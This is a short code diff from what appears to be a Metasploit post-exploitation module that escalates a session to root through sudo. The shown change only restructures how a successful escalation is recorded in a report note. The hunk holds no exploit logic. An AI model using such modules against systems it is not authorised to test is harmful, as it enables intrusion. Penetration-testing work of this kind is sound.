@@ -78,7 +78,7 @@ class MetasploitModule < Msf::Post
       report_note(
         host: session,
         type: 'host.escalation',
-        data: "User `#{session.exploit_datastore['USERNAME']}' sudo'ed to a root shell"
+        data: { :escalation => "User `#{session.exploit_datastore['USERNAME']}' sudo'ed to a root shell" }
       )
     else
       print_error "SUDO: Didn't work out, still a mere user."
